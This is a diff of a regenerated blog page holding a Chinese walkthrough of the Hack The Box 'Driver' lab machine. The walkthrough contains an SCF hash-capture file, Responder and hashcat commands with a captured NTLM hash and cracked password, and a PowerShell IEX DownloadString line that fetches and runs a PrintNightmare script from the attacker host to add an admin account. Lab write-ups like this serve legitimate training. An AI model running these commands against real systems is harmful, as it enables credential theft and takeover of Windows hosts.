@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 8.1.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
@@ -227,47 +227,48 @@
       
       <div class="post-body">
           <p>Hackthebox - Driver 靶场实战</p>
-<a id="more"></a>
+<span id="more"></span>
 
-<h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="http://img.npfs06.top/20211128153425.png" style="zoom:80%;">
+<h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="http://img.npfs06.top/20211128153425.png" style="zoom:80%;" />
 
 
 
 <h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a><strong>环境准备</strong></h1><p>连上平台给的<strong>openvpn</strong>，<strong>开启靶机</strong>得到：<strong>目标ip 10.10.11.106</strong></p>
-<p>kali openvpn连上<br><img src="http://img.npfs06.top/20211126231849.png" style="zoom:80%;"></p>
+<p>kali openvpn连上<br><img src="http://img.npfs06.top/20211126231849.png" style="zoom:80%;" /></p>
 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sV -p-  --min-rate <span class="number">5000</span> <span class="number">10.10.11.106</span></span><br></pre></td></tr></table></figure>
-<img src="http://img.npfs06.top/20211126231638.png" style="zoom:80%;">
+
+<img src="http://img.npfs06.top/20211126231638.png" style="zoom:80%;" />
 
 <p>开放了<strong>80、135、445、5985端口</strong>。</p>
 <p><strong>445端口</strong>是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机</p>
 <p><strong>5985端口</strong>是通过windows远程管理使用的，需要用工具<strong>evil-winrm远程连接管理</strong>。</p>
 <p>访问<strong>80端口</strong>看一下内容</p>
-<img src="http://img.npfs06.top/20211126232301.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211126232301.png" style="zoom:80%;" />
 
 <p>需要账号、密码，盲猜admin/admin ，登录成功</p>
-<img src="http://img.npfs06.top/20211126232402.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211126232402.png" style="zoom:80%;" />
 
 <p>MFP Firmware Update Center是惠普一款打印机，这个就是它的后台管理系统。</p>
 <p>找到一个文件上传页面</p>
-<img src="http://img.npfs06.top/20211127150937.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211127150937.png" style="zoom:80%;" />
 
 <p>先信息收集一波，看看有没有源码泄露之类的</p>
 <p>使用<strong>dirsearch目录扫描</strong></p>
-<img src="http://img.npfs06.top/20211126234025.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211126234025.png" style="zoom:80%;" />
 
 <p>没发现啥可利用的目录</p>
 <p><strong>whatweb</strong></p>
-<img src="http://img.npfs06.top/20211127000421.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211127000421.png" style="zoom:80%;" />
 
 
 
 <p>没有发现有用的信息，再来看下其他端口给了哪些信息。</p>
 <p>有445端口，使用smb_version扫描模块</p>
-<img src="http://img.npfs06.top/20211127000808.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211127000808.png" style="zoom:80%;" />
 
 <p>得到**版本Windows 10 Enterprise **</p>
 <p>因为是win10，永恒之蓝可能就不能用了</p>
-<img src="http://img.npfs06.top/20211127150152.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211127150152.png" style="zoom:80%;" />
 
 
 
@@ -292,26 +293,29 @@
 </ol>
 <h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><p><strong>（1）制作恶意文件</strong></p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Shell]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Command</span>=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="attr">IconFile</span>=\\<span class="number">10.10</span>.<span class="number">14.70</span>\share\pentestlab.ico</span><br><span class="line"></span><br><span class="line"><span class="section">[Taskbar]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Command</span>=ToggleDesktop</span><br></pre></td></tr></table></figure>
+
 <p>把上面的内容放入新建的<strong>send_hash.scf文件</strong>里，<strong>10.10.14.70</strong>是<strong>本机（攻击机）的ip。</strong></p>
-<img src="http://img.npfs06.top/20211128132145.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128132145.png" style="zoom:80%;" />
 
 <p><strong>（2）开启Responder监听</strong></p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="module-access"><span class="module"><span class="identifier">Responder</span>.</span></span>py -I tun3 -wrf</span><br></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> Responder.<span class="keyword">py</span> -I tun3 -wrf</span><br></pre></td></tr></table></figure>
+
 <p>这个选择htb的网卡，也就是tun3</p>
 <p><strong>（3）传文件</strong></p>
-<img src="http://img.npfs06.top/20211128132311.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128132311.png" style="zoom:80%;" />
 
 
 
 <p><strong>（4）成功接听</strong></p>
-<img src="http://img.npfs06.top/20211128132344.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128132344.png" style="zoom:80%;" />
 
 
 
 <p><strong>（5）爆破密码</strong></p>
 <p>使用hashcat爆破密码：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hashcat</span> -m <span class="number">5600</span> tony::DRIVER:<span class="number">6</span>aa<span class="number">918</span>d<span class="number">9</span>aeccc<span class="number">957</span>:DD<span class="number">714</span>FBEB<span class="number">5</span>E<span class="number">8840</span>C<span class="number">8</span>E<span class="number">782</span>C<span class="number">61868</span>C<span class="number">983</span>A:<span class="number">0101000000000000</span>F<span class="number">2</span>C<span class="number">6</span>EE<span class="number">2</span>C<span class="number">52</span>E<span class="number">4</span>D<span class="number">7011</span>F<span class="number">0</span>F<span class="number">2</span>FC<span class="number">0416</span>E<span class="number">643</span>B<span class="number">0000000002000400270027000000000000000000</span> /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
-<img src="http://img.npfs06.top/20211128133201.png" style="zoom:80%;">
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hashcat</span> -m <span class="number">5600</span> tony::DRIVER:<span class="number">6</span>aa918d9aeccc957:DD714FBEB5E8840C8E782C61868C983A:<span class="number">0101000000000000</span>F2C6EE2C52E4D7011F0F2FC0416E643B0000000002000400270027000000000000000000 /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
+
+<img src="http://img.npfs06.top/20211128133201.png" style="zoom:80%;" />
 
 
 
@@ -320,20 +324,22 @@
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -<span class="selector-tag">i</span> <span class="number">10.10</span>.<span class="number">11.106</span> -u tony -<span class="selector-tag">p</span> liltony</span><br></pre></td></tr></table></figure>
 
 
-<img src="http://img.npfs06.top/20211128002730.png" style="zoom:80%;">
+
+<img src="http://img.npfs06.top/20211128002730.png" style="zoom:80%;" />
 
 <p>成功拿到普通用户权限</p>
-<img src="http://img.npfs06.top/20211128133716.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128133716.png" style="zoom:80%;" />
 
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-process</span>  <span class="comment">#查看进程</span></span><br></pre></td></tr></table></figure>
 
 
-<img src="http://img.npfs06.top/20211128152424.png" style="zoom:80%;">
+
+<img src="http://img.npfs06.top/20211128152424.png" style="zoom:80%;" />
 
 
 
 <p>注意到有个进程叫做spoonlsv</p>
-<img src="http://img.npfs06.top/20211128152623.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128152623.png" style="zoom:80%;" />
 
 
 
@@ -341,33 +347,37 @@
 <p>把脚本下载下来放到攻击机桌面</p>
 <p>开个http服务，方便靶机下载</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
 <p>远程下载文件，并且使用脚本添加新用户</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">IEX</span><span class="params">(New-Object Net.WebClient)</span></span><span class="selector-class">.DownloadString</span>(<span class="string">&quot;http://10.10.14.70/CVE-2021-1675.ps1&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Nightmare</span> <span class="literal">-DriverName</span> <span class="string">&quot;DRIVER&quot;</span> <span class="literal">-NewUser</span> <span class="string">&quot;npfs&quot;</span> <span class="literal">-NewPassword</span> <span class="string">&quot;npfs123&quot;</span></span><br></pre></td></tr></table></figure>
-<img src="http://img.npfs06.top/20211128140546.png" style="zoom:80%;">
+
+<img src="http://img.npfs06.top/20211128140546.png" style="zoom:80%;" />
 
 
 
 <p>查看当前用户，发现添加成功</p>
-<img src="http://img.npfs06.top/20211128140528.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128140528.png" style="zoom:80%;" />
 
 <p>赋予用户npfs以管理员身份运行powershell的权限</p>
-<img src="http://img.npfs06.top/20211128151004.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128151004.png" style="zoom:80%;" />
 
 <p>查看管理员组，确认权限组没问题</p>
-<img src="http://img.npfs06.top/20211128151017.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128151017.png" style="zoom:80%;" />
 
 
 
 <p>使用新创建的账户进行登录</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">evil</span>-winrm -i <span class="number">10.10.11.106</span> -u npfs -p npfs<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -<span class="selector-tag">i</span> <span class="number">10.10</span>.<span class="number">11.106</span> -u npfs -<span class="selector-tag">p</span> npfs123</span><br></pre></td></tr></table></figure>
+
 <p>切换到管理员，flag在桌面的root.txt文件</p>
-<img src="http://img.npfs06.top/20211128150921.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128150921.png" style="zoom:80%;" />
 
 
 
 <p>成功！</p>
-<img src="http://img.npfs06.top/20211128151109.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20211128151109.png" style="zoom:80%;" />
       </div>
       
       
@@ -445,7 +455,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">108</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -509,7 +519,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2026</span>
 
 
 <!--
